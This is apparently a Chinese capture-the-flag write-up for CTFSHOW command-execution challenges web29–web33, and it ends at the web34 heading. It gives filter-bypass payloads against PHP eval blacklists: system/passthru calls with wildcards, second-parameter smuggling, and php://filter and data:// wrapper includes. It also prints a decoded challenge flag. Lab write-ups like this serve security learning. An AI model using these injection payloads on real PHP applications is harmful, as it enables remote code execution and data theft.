## CTFSHOW - 命令执行

### web29

```php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
```

ban了"flag"这个字符利用匹配

```python
?c=system("tac fl*");
?c=system("tac fla''g.php");
?c=system("tac fla``g.php");
```



### web30

相比于上一题多ban了`php` , `system`

```
?c=passthru("tac fl*");
```



### web31

```php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
```

又是多ban了几个东西

```python
#常规操作
?c=passthru("tac%09fla*");

?c=eval($_GET[a]);&a=system('tac flag.php');#这里只是过滤了c参数里面的内容，利用这个东西可以实现绕过
```

同时我发现有些空格的替代不能使用`${IFS}`等，这里我们得试一试

看了其他佬的东西：

```python
c=show_source(next(array_reverse(scandir(pos(localeconv())))));

localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个"."
pos():输出数组第一个元素，不改变指针；
scandir();遍历目录，这里因为参数为"."所以遍历当前目录
array_reverse():元组倒置
next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以
show_source():查看源码
```



### web32

```php
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
```

这道题利用php伪协议

```python
?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
#?>的作用是作为绕过分号，作为语句的结束。原理是：php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?>前可以不写分号。
?c=include$_GET[1]?>&1=data://text/plain,<?php system("nl flag.php")?>
```

解码之后：

```
┌──(root㉿BX-legion)-[~]
└─# echo PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6NDk6MjYNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7YjJmZjU1ZDEtMGViYi00NWIxLTllOWMtMTNkYmI2NjFmZGZmfSI7DQo |base64 -d

<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:49:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/
$flag="ctfshow{b2ff55d1-0ebb-45b1-9e9c-13dbb661fdff}";
base64: invalid input
```



### web33

```php
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
```

跟上一题类似但是不能使用`php://`协议，被ban了，但是可以使用`data://`

看了一下是还可以利用日志包含绕过！！！



### web34

